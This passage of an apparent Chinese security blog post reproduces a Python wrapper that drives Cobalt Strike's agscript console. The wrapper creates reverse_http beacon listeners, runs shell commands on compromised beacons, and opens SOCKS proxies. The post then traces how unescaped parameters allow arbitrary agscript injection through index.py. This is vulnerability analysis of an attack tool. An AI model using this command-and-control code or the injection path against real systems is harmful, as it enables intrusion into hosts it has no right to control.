            <span class="n">link</span> <span class="o">=</span> <span class="s2">"http://{}:{}{}"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">site</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s1">'</span><span class="se">\"</span><span class="s1">'</span><span class="p">),</span> <span class="n">port</span><span class="p">,</span> <span class="n">uri</span><span class="p">)</span>

        <span class="k">if</span> <span class="n">use_ssl</span><span class="p">:</span>
            <span class="n">use_ssl</span> <span class="o">=</span> <span class="s2">"true"</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">use_ssl</span> <span class="o">=</span> <span class="s2">"false"</span>

        <span class="k">if</span> <span class="n">file_path</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">'/'</span><span class="p">:</span>
            <span class="n">file_path</span> <span class="o">=</span> <span class="n">abspath</span><span class="p">(</span><span class="n">file_path</span><span class="p">)</span>

        <span class="n">file_path</span> <span class="o">=</span> <span class="n">f</span><span class="s2">"'{file_path}'"</span>

        <span class="n">multiline</span> <span class="o">=</span> <span class="n">f</span><span class="s2">"""</span>
<span class="s2">        $handle = openf({file_path});</span>
<span class="s2">        $content = readb($handle, -1);</span>
<span class="s2">        closef($handle);</span>
<span class="s2">        site_host({site}, {port}, "{uri}", $content, "{mime_type}", "{description}", {use_ssl});</span>
<span class="s2">        """</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">ag_sendline_multiline</span><span class="p">(</span><span class="n">multiline</span><span class="p">,</span> <span class="n">sleep_time</span><span class="o">=</span><span class="n">sleep_time</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">link</span>


    <span class="k">def</span> <span class="nf">get_local_ip</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
        <span class="n">command</span> <span class="o">=</span> <span class="s2">"return localip()"</span>
        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">ag_get_object</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">get_listener_info</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">name</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">list</span><span class="p">:</span>
        <span class="n">command</span> <span class="o">=</span> <span class="n">f</span><span class="s1">'return listener_info("{name}")'</span>
        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">ag_get_object</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">get_beacons</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">list</span><span class="p">:</span>
        <span class="n">command</span> <span class="o">=</span> <span class="s2">"return beacons()"</span>
        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">ag_get_object</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">create_http_listener</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">name</span><span class="p">,</span><span class="n">ip</span><span class="p">,</span><span class="n">port</span><span class="p">,</span><span class="n">return_ip</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">list</span><span class="p">:</span>
        <span class="n">command</span> <span class="o">=</span> <span class="n">f</span><span class="s1">'listener_create("{str(name)}", "windows/beacon_http/reverse_http","{str(ip)}","{str(port)}","{str(return_ip)}")'</span>
        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">ag_get_object</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">beacon_shell</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="nb">id</span><span class="p">,</span><span class="n">cmd</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">list</span><span class="p">:</span>
        <span class="n">command</span> <span class="o">=</span> <span class="n">f</span><span class="s1">'bshell("{id}", "{cmd}")'</span>
        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">ag_get_object</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">get_listener_test_info</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">name</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">list</span><span class="p">:</span>
        <span class="n">command</span> <span class="o">=</span> <span class="n">f</span><span class="s1">'listener_info("{name}")'</span>
        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">ag_get_object</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>


    <span class="k">def</span> <span class="nf">create_socks</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="nb">id</span><span class="p">,</span><span class="n">port</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">list</span><span class="p">:</span>
        <span class="n">command</span> <span class="o">=</span> <span class="n">f</span><span class="s1">'return bsocks("{str(id)}","{str(port)}")'</span>
        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">ag_get_object</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">run_script</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">script_content</span><span class="p">):</span>
        <span class="n">command</span> <span class="o">=</span> <span class="n">f</span><span class="s2">"{str(script_content)}"</span>
        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">ag_get_object</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">connectTeamserver</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="s2">"{}{}"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">cs_directory</span><span class="p">,</span> <span class="s2">"/cobaltstrike.jar"</span><span class="p">)):</span>
            <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s2">"Error: Cobalt Strike JAR file not found"</span><span class="p">)</span>
        <span class="n">command</span> <span class="o">=</span> <span class="s2">"{} {} {} {} {}"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">aggscriptcmd</span><span class="p">,</span>
                                        <span class="bp">self</span><span class="o">.</span><span class="n">cs_host</span><span class="p">,</span>
                                        <span class="bp">self</span><span class="o">.</span><span class="n">cs_port</span><span class="p">,</span>
                                        <span class="bp">self</span><span class="o">.</span><span class="n">cs_user</span><span class="p">,</span>
                                        <span class="bp">self</span><span class="o">.</span><span class="n">cs_pass</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">cs_process</span> <span class="o">=</span> <span class="n">pexpect</span><span class="o">.</span><span class="n">spawn</span><span class="p">(</span><span class="s2">"{} {} {} {} {}"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">aggscriptcmd</span><span class="p">,</span>
                                                                            <span class="bp">self</span><span class="o">.</span><span class="n">cs_host</span><span class="p">,</span>
                                                                            <span class="bp">self</span><span class="o">.</span><span class="n">cs_port</span><span class="p">,</span>
                                                                            <span class="bp">self</span><span class="o">.</span><span class="n">cs_user</span><span class="p">,</span>
                                                                            <span class="bp">self</span><span class="o">.</span><span class="n">cs_pass</span><span class="p">),</span> <span class="n">cwd</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">cs_directory</span><span class="p">)</span>

        <span class="k">if</span> <span class="ow">not</span> <span class="bp">self</span><span class="o">.</span><span class="n">cs_process</span><span class="o">.</span><span class="n">isalive</span><span class="p">():</span>
            <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s2">"Error connecting to CS team server! Check config and try again."</span><span class="p">)</span>


        <span class="k">try</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">cs_process</span><span class="o">.</span><span class="n">expect</span><span class="p">(</span><span class="sa">r</span><span class="s1">'\x1b\[4maggressor\x1b\[0m&gt;'</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">send_ready_command</span><span class="p">()</span>
        <span class="k">except</span> <span class="p">(</span><span class="n">pexpect</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">TIMEOUT</span><span class="p">,</span> <span class="n">pexpect</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">EOF</span><span class="p">):</span>
            <span class="k">print</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">cs_process</span><span class="o">.</span><span class="n">before</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
            <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s2">"EOF encountered"</span><span class="p">)</span> <span class="kn">from</span> <span class="bp">None</span>

    <span class="k">def</span> <span class="nf">send_ready_command</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">cmd</span> <span class="o">=</span> <span class="s1">'on ready { println("Successfully" . " connected to teamserver!"); }'</span>
        <span class="n">expect</span> <span class="o">=</span> <span class="s1">'.*Successfully connected to teamserver!.*'</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">ag_get_string</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">expect</span><span class="o">=</span><span class="n">expect</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">disconnectTeamserver</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>

        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">cs_process</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">cs_process</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="s2">"CS was already disconnected! Hopefully you already knew this."</span><span class="p">)</span>



    <span class="k">def</span> <span class="nf">ag_sendline</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">cmd</span><span class="p">,</span> <span class="n">script_console_command</span><span class="o">=</span><span class="s1">'e'</span><span class="p">,</span> <span class="n">sleep_time</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">0</span><span class="p">):</span>
        <span class="k">if</span> <span class="s1">''</span> <span class="o">==</span> <span class="n">cmd</span><span class="p">:</span>
            <span class="n">full_cmd</span> <span class="o">=</span> <span class="s2">"{}"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">script_console_command</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">full_cmd</span> <span class="o">=</span> <span class="s2">"{} {}"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">script_console_command</span><span class="p">,</span> <span class="n">cmd</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">cs_process</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">full_cmd</span><span class="p">)</span>
        <span class="n">sleep</span><span class="p">(</span><span class="n">sleep_time</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">full_cmd</span>

    <span class="k">def</span> <span class="nf">ag_sendline_multiline</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">multiline</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">script_console_command</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s1">'e'</span><span class="p">,</span> <span class="n">sleep_time</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">0</span><span class="p">):</span>
        <span class="n">oneline</span> <span class="o">=</span> <span class="n">convert_to_oneline</span><span class="p">(</span><span class="n">multiline</span><span class="p">)</span>
        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">ag_sendline</span><span class="p">(</span><span class="n">oneline</span><span class="p">,</span> <span class="n">script_console_command</span><span class="o">=</span><span class="n">script_console_command</span><span class="p">,</span> <span class="n">sleep_time</span><span class="o">=</span><span class="n">sleep_time</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">ag_get_string_multiline</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">multiline</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">script_console_command</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s1">'e'</span><span class="p">,</span> <span class="n">expect</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="sa">r</span><span class="s1">'\r\n\x1b\[4maggressor\x1b\[0m&gt;'</span><span class="p">,</span> <span class="n">timeout</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">sleep_time</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
        <span class="n">oneline</span> <span class="o">=</span> <span class="n">convert_to_oneline</span><span class="p">(</span><span class="n">multiline</span><span class="p">)</span>
        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">ag_get_string</span><span class="p">(</span><span class="n">oneline</span><span class="p">,</span> <span class="n">script_console_command</span><span class="o">=</span><span class="n">script_console_command</span><span class="p">,</span> <span class="n">expect</span><span class="o">=</span><span class="n">expect</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="n">timeout</span><span class="p">,</span> <span class="n">sleep_time</span><span class="o">=</span><span class="n">sleep_time</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">ag_get_string</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">cmd</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">script_console_command</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s1">'e'</span><span class="p">,</span> <span class="n">expect</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="sa">r</span><span class="s1">'\r\n\x1b\[4maggressor\x1b\[0m&gt;'</span><span class="p">,</span> <span class="n">timeout</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">sleep_time</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
        <span class="n">full_cmd</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">ag_sendline</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">script_console_command</span><span class="o">=</span><span class="n">script_console_command</span><span class="p">,</span> <span class="n">sleep_time</span><span class="o">=</span><span class="n">sleep_time</span><span class="p">)</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">cs_process</span><span class="o">.</span><span class="n">expect</span><span class="p">(</span><span class="n">escape</span><span class="p">(</span><span class="n">full_cmd</span><span class="p">),</span> <span class="n">timeout</span><span class="o">=</span><span class="n">timeout</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">cs_process</span><span class="o">.</span><span class="n">expect</span><span class="p">(</span><span class="n">expect</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="n">timeout</span><span class="p">)</span>

        <span class="n">before</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">cs_process</span><span class="o">.</span><span class="n">before</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
        <span class="k">return</span> <span class="n">before</span>

    <span class="k">def</span> <span class="nf">ag_get_object_multiline</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">multiline</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">script_console_command</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s1">'e'</span><span class="p">,</span> <span class="n">expect</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="sa">r</span><span class="s1">'\r\n\x1b\[4maggressor\x1b\[0m&gt;'</span><span class="p">,</span> <span class="n">timeout</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">sleep_time</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">0</span><span class="p">):</span>
        <span class="n">oneline</span> <span class="o">=</span> <span class="n">convert_to_oneline</span><span class="p">(</span><span class="n">multiline</span><span class="p">)</span>
        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">ag_get_object</span><span class="p">(</span><span class="n">oneline</span><span class="p">,</span> <span class="n">script_console_command</span><span class="o">=</span><span class="n">script_console_command</span><span class="p">,</span> <span class="n">expect</span><span class="o">=</span><span class="n">expect</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="n">timeout</span><span class="p">,</span> <span class="n">sleep_time</span><span class="o">=</span><span class="n">sleep_time</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">ag_get_object</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">cmd</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">script_console_command</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s1">'e'</span><span class="p">,</span> <span class="n">expect</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="sa">r</span><span class="s1">'\r\n\x1b\[4maggressor\x1b\[0m&gt;'</span><span class="p">,</span> <span class="n">timeout</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">sleep_time</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
        <span class="n">wrapped</span> <span class="o">=</span> <span class="n">wrap_command</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
        <span class="n">match</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">ag_get_string</span><span class="p">(</span><span class="n">wrapped</span><span class="p">,</span> <span class="n">script_console_command</span><span class="o">=</span><span class="n">script_console_command</span><span class="p">,</span> <span class="n">expect</span><span class="o">=</span><span class="n">expect</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="n">timeout</span><span class="p">,</span> <span class="n">sleep_time</span><span class="o">=</span><span class="n">sleep_time</span><span class="p">)</span>
        <span class="n">base64_regex</span> <span class="o">=</span> <span class="sa">r</span><span class="s2">"^(?:[A-Za-z0-9+\/]{4})*(?:[A-Za-z0-9+\/]{2}==|[A-Za-z0-9+\/]{3}=|[A-Za-z0-9+\/]{4})$"</span>
        <span class="n">parse</span> <span class="o">=</span> <span class="n">findall</span><span class="p">(</span><span class="n">base64_regex</span><span class="p">,</span> <span class="n">match</span><span class="p">,</span> <span class="n">MULTILINE</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">parse</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">deserialize</span><span class="p">(</span><span class="n">parse</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="n">f</span><span class="s2">"Base64 regex found no match on {match[:50]}"</span><span class="p">)</span> <span class="kn">from</span> <span class="bp">None</span>

    <span class="k">def</span> <span class="nf">parse_aggressor_properties</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">aggprop</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
        <span class="n">connections</span> <span class="o">=</span> <span class="n">defaultdict</span><span class="p">(</span><span class="nb">dict</span><span class="p">)</span>

        <span class="k">if</span> <span class="ow">not</span> <span class="n">aggprop</span><span class="p">:</span>
            <span class="n">homedir</span> <span class="o">=</span> <span class="n">path</span><span class="o">.</span><span class="n">expanduser</span><span class="p">(</span><span class="s2">"~"</span><span class="p">)</span>
            <span class="n">aggprop</span><span class="o">=</span> <span class="n">f</span><span class="s2">"{homedir}/.aggressor.prop"</span>

        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">aggprop</span><span class="p">,</span> <span class="s2">"r"</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
            <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="nb">file</span><span class="o">.</span><span class="n">readlines</span><span class="p">():</span>
                <span class="k">if</span> <span class="s2">"connection.profiles."</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span>
                    <span class="n">regexes</span> <span class="o">=</span> <span class="p">[</span>
                        <span class="sa">r</span><span class="s2">"connection\.profiles\.(.*?)\.user=(.*)"</span><span class="p">,</span>
                        <span class="sa">r</span><span class="s2">"connection\.profiles\.(.*?)\.password=(.*)"</span><span class="p">,</span>
                        <span class="sa">r</span><span class="s2">"connection\.profiles\.(.*?)\.port=(.*)"</span>
                    <span class="p">]</span>

                    <span class="n">keys</span> <span class="o">=</span> <span class="p">[</span>
                        <span class="s2">"user"</span><span class="p">,</span>
                        <span class="s2">"password"</span><span class="p">,</span>
                        <span class="s2">"port"</span>
                    <span class="p">]</span>

                    <span class="k">for</span> <span class="n">regex</span><span class="p">,</span> <span class="n">key</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">regexes</span><span class="p">,</span> <span class="n">keys</span><span class="p">):</span>
                        <span class="n">matches</span> <span class="o">=</span> <span class="n">findall</span><span class="p">(</span><span class="n">regex</span><span class="p">,</span> <span class="n">line</span><span class="p">)</span>
                        <span class="k">if</span> <span class="n">matches</span><span class="p">:</span>
                            <span class="n">match</span> <span class="o">=</span> <span class="n">matches</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
                            <span class="n">ip</span><span class="p">,</span> <span class="n">value</span> <span class="o">=</span> <span class="n">match</span>
                            <span class="n">connection</span> <span class="o">=</span> <span class="n">connections</span><span class="p">[</span><span class="n">ip</span><span class="p">]</span>
                            <span class="n">connection</span><span class="p">[</span><span class="n">key</span><span class="p">]</span> <span class="o">=</span> <span class="n">value</span>

        <span class="k">return</span> <span class="n">connections</span>

<span class="k">def</span> <span class="nf">parseArguments</span><span class="p">():</span>
    <span class="n">parser</span> <span class="o">=</span> <span class="n">ArgumentParser</span><span class="p">()</span>

    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">"-t"</span><span class="p">,</span> <span class="s2">"--teamserver"</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">"the hostname or IP address of the teamserver"</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">"-u"</span><span class="p">,</span> <span class="s2">"--user"</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">"the user to connect to the teamserver as (_striker will be added)"</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="n">environ</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'USER'</span><span class="p">))</span>
    <span class="c1"># TODO: Make this requirement optional and if not provided, secure prompt for password</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">"-p"</span><span class="p">,</span> <span class="s2">"--password"</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">"the password for the teamserver, if not provided, you will be prompted"</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="bp">None</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">"-P"</span><span class="p">,</span> <span class="s2">"--port"</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">"the port for the teamserver, default is 50050"</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="mi">50050</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">"-j"</span><span class="p">,</span> <span class="s2">"--javadir"</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">"the path to the directory containing the Cobalt Strike JAR file"</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s2">"./"</span><span class="p">)</span>

    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">args</span>


<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">args</span> <span class="o">=</span> <span class="n">parseArguments</span><span class="p">()</span>

    <span class="k">with</span> <span class="n">CSConnector</span><span class="p">(</span>
        <span class="n">args</span><span class="o">.</span><span class="n">teamserver</span><span class="p">,</span>
        <span class="n">cs_user</span><span class="o">=</span><span class="n">args</span><span class="o">.</span><span class="n">user</span><span class="p">,</span>
        <span class="n">cs_pass</span><span class="o">=</span><span class="n">args</span><span class="o">.</span><span class="n">password</span><span class="p">,</span>
        <span class="n">cs_directory</span><span class="o">=</span><span class="n">args</span><span class="o">.</span><span class="n">javadir</span><span class="p">,</span>
        <span class="n">cs_port</span><span class="o">=</span><span class="n">args</span><span class="o">.</span><span class="n">port</span>
    <span class="p">)</span> <span class="k">as</span> <span class="n">cs</span><span class="p">:</span>
        <span class="k">pass</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>
    <span class="kn">from</span> <span class="nn">argparse</span> <span class="kn">import</span> <span class="n">ArgumentParser</span>
    <span class="kn">from</span> <span class="nn">os</span> <span class="kn">import</span> <span class="n">environ</span>
    <span class="n">main</span><span class="p">()</span>
</pre></div>
<p>经过源码分析或者项目readme可以得知此项目是调用的cs的agscript来控制CS服务端</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241203235656-38be1a1c-b18f-1.png"/></p>
<p>接着跟踪发现执行的agscript脚本，比如beacon_shell利用beaconid指定beacon执行相应命令agscript</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241203235648-341e4a68-b18f-1.png"/></p>
<p>CS官方文档可以参考 文档地址：<a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm" target="_blank">Functions</a></p>
<p>只要我们可以控制command这个参数的值，我们就可以执行任意agscript脚本代码，回到index.py确实发现参数可控</p>
<div class="highlight"><pre><span></span><span class="k">with</span> <span class="n">CSConnector</span><span class="p">(</span>
        <span class="n">cs_host</span><span class="o">=</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span>
        <span class="n">cs_port</span><span class="o">=</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span>
        <span class="n">cs_user</span><span class="o">=</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">4</span><span class="p">],</span>
        <span class="n">cs_pass</span><span class="o">=</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">5</span><span class="p">],</span>
        <span class="n">cs_directory</span><span class="o">=</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">6</span><span class="p">])</span> <span class="k">as</span> <span class="n">cs</span><span class="p">:</span>
    <span class="n">output</span> <span class="o">=</span> <span class="s2">""</span>
    <span class="k">if</span><span class="p">(</span><span class="n">command_type</span> <span class="o">==</span> <span class="s2">"beacon_shell"</span><span class="p">):</span>
        <span class="n">beaconid</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span>
        <span class="n">CSCmd</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span>
        <span class="n">output</span> <span class="o">=</span> <span class="n">cs</span><span class="o">.</span><span class="n">beacon_shell</span><span class="p">(</span><span class="n">beaconid</span><span class="p">,</span><span class="n">CSCmd</span><span class="p">)</span>
    <span class="k">elif</span><span class="p">(</span><span class="n">command_type</span> <span class="o">==</span> <span class="s2">"create_http_listener"</span><span class="p">):</span>
        <span class="n">ListenerName</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span>
        <span class="n">ListenerType</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="c1">#后面固定了，懒得改了</span>
        <span class="n">ListenerIp</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span>
        <span class="n">ListenerPort</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span>
        <span class="n">output</span> <span class="o">=</span> <span class="n">cs</span><span class="o">.</span><span class="n">create_http_listener</span><span class="p">(</span><span class="n">ListenerName</span><span class="p">,</span><span class="n">ListenerIp</span><span class="p">,</span><span class="n">ListenerPort</span><span class="p">,</span><span class="n">ListenerIp</span><span class="p">)</span>
    <span class="k">elif</span><span class="p">(</span><span class="n">command_type</span> <span class="o">==</span> <span class="s2">"get_beacons"</span><span class="p">):</span>
        <span class="n">output</span> <span class="o">=</span> <span class="n">cs</span><span class="o">.</span><span class="n">get_beacons</span><span class="p">()</span>
